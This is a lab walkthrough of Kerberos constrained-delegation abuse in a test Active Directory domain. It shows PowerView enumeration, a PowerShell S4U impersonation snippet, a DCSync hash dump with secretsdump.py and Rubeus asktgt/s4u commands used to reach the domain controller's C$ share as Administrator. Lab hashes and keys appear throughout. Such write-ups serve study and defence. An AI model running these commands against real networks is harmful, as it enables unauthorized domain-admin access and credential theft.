Thanks for : 

http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/

https://github.com/GhostPack/Rubeus#constrained-delegation-abuse

https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py


Lets say during our enumeration we found computer objects given rights to constrained delegation. 


	PS C:\Users\testuser\Desktop> Get-DomainComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto,useraccountcontrol | fl


	samaccountname           : LOKI$
	msds-allowedtodelegateto : {cifs/kabil.child.valhalla.local/child.valhalla.local, cifs/kabil.child.valhalla.local, cifs/KABIL, cifs/kabil.child.valhalla.local/CHILD...}
	useraccountcontrol       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION

	samaccountname           : TestMachine$
	msds-allowedtodelegateto : {cifs/kabil.child.valhalla.local/child.valhalla.local, cifs/kabil.child.valhalla.local, cifs/KABIL, cifs/kabil.child.valhalla.local/CHILD...}
	useraccountcontrol       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION

if we check details of computer named (loki)

	PS C:\Users\testuser\Desktop> Get-DomainComputer -Identity loki
	
	logoncount                    : 80
	badpasswordtime               : 1/1/1601 2:00:00 AM
	distinguishedname             : CN=LOKI,CN=Computers,DC=child,DC=valhalla,DC=local
	objectclass                   : {top, person, organizationalPerson, user...}
	badpwdcount                   : 0
	lastlogontimestamp            : 12/26/2021 6:11:53 PM
	objectsid                     : S-1-5-21-988250465-358338136-668553488-1105
	samaccountname                : LOKI$
	localpolicyflags              : 0
	codepage                      : 0
	samaccounttype                : MACHINE_ACCOUNT
	countrycode                   : 0
	cn                            : LOKI
	accountexpires                : NEVER
	whenchanged                   : 12/28/2021 5:22:22 PM
	instancetype                  : 4
	usncreated                    : 13030
	objectguid                    : 9c39686b-dc6a-4752-bafd-2ae63f50facc
	operatingsystem               : Windows 10 Pro
	operatingsystemversion        : 10.0 (10586)
	lastlogoff                    : 1/1/1601 2:00:00 AM
	msds-allowedtodelegateto      : {cifs/kabil.child.valhalla.local/child.valhalla.local, cifs/kabil.child.valhalla.local, cifs/KABIL,
									cifs/kabil.child.valhalla.local/CHILD...}
	objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=valhalla,DC=local
	dscorepropagationdata         : 1/1/1601 12:00:00 AM
	serviceprincipalname          : {TERMSRV/LOKI, TERMSRV/loki.child.valhalla.local, RestrictedKrbHost/LOKI, HOST/LOKI...}
	lastlogon                     : 12/28/2021 7:23:32 PM
	iscriticalsystemobject        : False
	usnchanged                    : 24608
	useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
	whencreated                   : 11/26/2021 7:15:43 AM
	primarygroupid                : 515
	pwdlastset                    : 12/27/2021 10:12:03 PM
	msds-supportedencryptiontypes : 28
	name                          : LOKI
	dnshostname                   : loki.child.valhalla.local
	
So this object can act behalf other users and access "cifs/kabil.child.valhalla.local/child.valhalla.local" service. 

# I am the machine

In our scenario we already comprimised "loki" machine and we have system rights. We will abuse this configuration and access service.

Firstly lets check our current permissions and profile

	PS C:\Users\testuser\Desktop> whoami
	nt authority\system
	PS C:\Users\testuser\Desktop> hostname
	loki
	
We will try to access "c\$" share on domain controller (kabil.child.valhalla.local)

	PS C:\Users\testuser\Desktop> dir \\kabil\c$
	dir : Access is denied
	At line:1 char:1
	+ dir \\kabil\c$
	+ ~~~~~~~~~~~~~~
		+ CategoryInfo          : PermissionDenied: (\\kabil\c$:String) [Get-ChildItem], UnauthorizedAccessException
		+ FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

	dir : Cannot find path '\\kabil\c$' because it does not exist.
	At line:1 char:1
	+ dir \\kabil\c$
	+ ~~~~~~~~~~~~~~
		+ CategoryInfo          : ObjectNotFound: (\\kabil\c$:String) [Get-ChildItem], ItemNotFoundException
		+ FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand

We got permission denied as expected. We dont have rights to access there but someone has like.... DOMAIN ADMINS :)

We will ask ticket on behalf of a Domain admin user and access service with that.

Lets find domain admin users:

	PS C:\Users\testuser\Desktop> Get-DomainGroupMember -Identity "Domain Admins" | select MemberName

	MemberName
	----------
	superuser
	Administrator

We can use either of them. Lets focus "administrator" user for now.

Thanks to [this](http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/) we can do this with correct calls

Full code is:

	# load the necessary assembly
	$Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

	# execute S4U2Self w/ WindowsIdentity to request a forwardable TGS for the specified user
	$Ident = New-Object System.Security.Principal.WindowsIdentity @('Administrator@child.valhalla.LOCAL')

	# actually impersonate the next context
	$Context = $Ident.Impersonate()

	# implicitly invoke S4U2Proxy with the specified action
	ls \\kabil\C$

	# undo the impersonation context
	$Context.Undo()
	
Execution

	PS C:\Users\testuser\Desktop> $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
	PS C:\Users\testuser\Desktop> $Ident = New-Object System.Security.Principal.WindowsIdentity @('Administrator@child.valhalla.LOCAL')
	PS C:\Users\testuser\Desktop> $Context = $Ident.Impersonate()
	PS C:\Users\testuser\Desktop> ls \\kabil\C$
		Directory: \\kabil\C$
		
	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	d-----        8/22/2013   5:52 PM                PerfLogs
	d-r---       12/12/2021   8:30 PM                Program Files
	d-----       11/26/2021   9:40 AM                Program Files (x86)
	d-r---       12/12/2021   8:21 PM                Users
	d-----       11/26/2021   9:10 AM                Windows

# I got Machine Account Hash Dad

Okay in this scenario kinda different but still i want to add it to understand how it works. Let say "somehow" we got machine account hash. (it could be comprimising machine and read hash from memory or via dcsync)

First check purge all tickets and check your access to "c\$" share

	PS C:\Users\testuser\Desktop> klist purge

	Current LogonId is 0:0x4b7cf
			Deleting all tickets:
			Ticket(s) purged!
	PS C:\Users\testuser\Desktop> ls \\kabil\c$
	ls : Access is denied
	At line:1 char:1
	+ ls \\kabil\c$
	+ ~~~~~~~~~~~~~
		+ CategoryInfo          : PermissionDenied: (\\kabil\c$:String) [Get-ChildItem], UnauthorizedAccessException
		+ FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

	ls : Cannot find path '\\kabil\c$' because it does not exist.
	At line:1 char:1
	+ ls \\kabil\c$
	+ ~~~~~~~~~~~~~
		+ CategoryInfo          : ObjectNotFound: (\\kabil\c$:String) [Get-ChildItem], ItemNotFoundException
		+ FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand


We can request a TGT with that hash and act like machine account. Just to demonstrate i will make a dcsync and get machine account hash with secretsdump.py

	┌──(kali㉿kali)-[~]
	└─$ secretsdump.py 'child/superuser@192.168.200.200' -just-dc-user 'loki$'                                    
	Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

	Password:
	[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
	[*] Using the DRSUAPI method to get NTDS.DIT secrets
	LOKI$:1105:aad3b435b51404eeaad3b435b51404ee:06b2028817ae690f992968de28e24931:::
	[*] Kerberos keys grabbed
	LOKI$:aes256-cts-hmac-sha1-96:afc7b75072f3e1c04c4f55c17d38df257551b6f89188002516ba5c3f116a6440
	LOKI$:aes128-cts-hmac-sha1-96:f3a8418bb3d9803f000aad26ed3819d2
	LOKI$:des-cbc-md5:b925375e3bf20276
	[*] Cleaning up... 

Okay our hash value is "06b2028817ae690f992968de28e24931" of "loki$" machine account

Lets request a TGT for this account

	PS C:\Users\testuser\Desktop> .\Rubeus.exe asktgt /user:loki$ /rc4:06b2028817ae690f992968de28e24931 /ptt

	[*] Action: Ask TGT

	[*] Using rc4_hmac hash: 06b2028817ae690f992968de28e24931
	[*] Building AS-REQ (w/ preauth) for: 'child.valhalla.local\loki$'
	[+] TGT request successful!
	[*] base64(ticket.kirbi):

		  doIFLDCCBSigAwIBBaEDAgEWooIELDCCBChhggQkMIIEIKADAgEFoRYbFENISUxELlZBTEhBTExBLkxP
		  ...........
		  bGEubG9jYWw=
	[+] Ticket successfully imported!

	  ServiceName              :  krbtgt/child.valhalla.local
	  ServiceRealm             :  CHILD.VALHALLA.LOCAL
	  UserName                 :  loki$
	  UserRealm                :  CHILD.VALHALLA.LOCAL
	  StartTime                :  12/28/2021 7:49:38 PM
	  EndTime                  :  12/29/2021 5:49:38 AM
	  RenewTill                :  1/4/2022 7:49:38 PM
	  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
	  KeyType                  :  rc4_hmac
	  Base64(key)              :  CJKzic2nN9SB6ptCkEplqw==
	  ASREP (key)              :  06B2028817AE690F992968DE28E24931

Check tickets and try to access the share with it

	PS C:\Users\testuser\Desktop> klist

	Current LogonId is 0:0x4b7cf

	Cached Tickets: (1)

	#0>     Client: loki$ @ CHILD.VALHALLA.LOCAL
			Server: krbtgt/child.valhalla.local @ CHILD.VALHALLA.LOCAL
			KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
			Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
			Start Time: 12/28/2021 19:49:38 (local)
			End Time:   12/29/2021 5:49:38 (local)
			Renew Time: 1/4/2022 19:49:38 (local)
			Session Key Type: RSADSI RC4-HMAC(NT)
			Cache Flags: 0x1 -> PRIMARY
			Kdc Called:
	PS C:\Users\testuser\Desktop> ls \\kabil\c$
	ls : Access is denied
	At line:1 char:1
	+ ls \\kabil\c$
	+ ~~~~~~~~~~~~~
		+ CategoryInfo          : PermissionDenied: (\\kabil\c$:String) [Get-ChildItem], UnauthorizedAccessException
		+ FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

	ls : Cannot find path '\\kabil\c$' because it does not exist.
	At line:1 char:1
	+ ls \\kabil\c$
	+ ~~~~~~~~~~~~~
		+ CategoryInfo          : ObjectNotFound: (\\kabil\c$:String) [Get-ChildItem], ItemNotFoundException
		+ FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
		
As expected we can't still access the share. We will abuse Constrained delegation configuration and request from KDC as "loki$" machine account for "cifs/kabil.child.valhalla.local/child.valhalla.local" service.

	PS C:\Users\testuser\Desktop> .\Rubeus.exe s4u /user:loki$ /rc4:06b2028817ae690f992968de28e24931 /impersonateuser:admini
	strator /domain:child.valhalla.local /msdsspn:"cifs/kabil" /altservice:cifs /ptt


	[*] Action: S4U

	[*] Using rc4_hmac hash: 06b2028817ae690f992968de28e24931
	[*] Building AS-REQ (w/ preauth) for: 'child.valhalla.local\loki$'
	[+] TGT request successful!
	[*] base64(ticket.kirbi):

		  doIFLDCCBSigAwIBBaEDAgEWooIELDCCBChhggQkMIIEIKADAgEFoRYbFENISUxELlZBTEhBTExBLkxP
		  .........
		  bGEubG9jYWw=


	[*] Action: S4U

	[*] Using domain controller: kabil.child.valhalla.local (192.168.200.200)
	[*] Building S4U2self request for: 'loki$@CHILD.VALHALLA.LOCAL'
	[*] Sending S4U2self request
	[+] S4U2self success!
	[*] Got a TGS for 'administrator' to 'loki$@CHILD.VALHALLA.LOCAL'
	[*] base64(ticket.kirbi):

		  doIFljCCBZKgAwIBBaEDAgEWooIElTCCBJFhggSNMIIEiaADAgEFoRYbFENISUxELlZBTEhBTExBLkxP
		  ..........
		  MTA0MTc1NDM2WqgWGxRDSElMRC5WQUxIQUxMQS5MT0NBTKkSMBCgAwIBAaEJMAcbBWxva2kk

	[*] Impersonating user 'administrator' to target SPN 'cifs/kabil'
	[*]   Final ticket will be for the alternate service 'cifs'
	[*] Using domain controller: kabil.child.valhalla.local (192.168.200.200)
	[*] Building S4U2proxy request for service: 'cifs/kabil'
	[*] Sending S4U2proxy request
	[+] S4U2proxy success!
	[*] Substituting alternative service name 'cifs'
	[*] base64(ticket.kirbi) for SPN 'cifs/kabil':

		  doIGIjCCBh6gAwIBBaEDAgEWooIFKzCCBSdhggUjMIIFH6ADAgEFoRYbFENISUxELlZBTEhBTExBLkxP
		 ............
		  DRsEY2lmcxsFa2FiaWw=
	[+] Ticket successfully imported!

Now check current tickets

	PS C:\Users\testuser\Desktop> klist
	Current LogonId is 0:0x4b7cf
	Cached Tickets: (1)
	#0>     Client: administrator @ CHILD.VALHALLA.LOCAL
			Server: cifs/kabil @ CHILD.VALHALLA.LOCAL
			KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
			Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
			Start Time: 12/28/2021 19:54:36 (local)
			End Time:   12/29/2021 5:54:36 (local)
			Renew Time: 1/4/2022 19:54:36 (local)
			Session Key Type: AES-128-CTS-HMAC-SHA1-96
			Cache Flags: 0
			Kdc Called:
			
Access the service

	PS C:\Users\testuser\Desktop> ls \\kabil\c$
		Directory: \\kabil\c$
	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	d-----        8/22/2013   5:52 PM                PerfLogs
	d-r---       12/12/2021   8:30 PM                Program Files
	d-----       11/26/2021   9:40 AM                Program Files (x86)
	d-r---       12/12/2021   8:21 PM                Users
	d-----       11/26/2021   9:10 AM                Windows

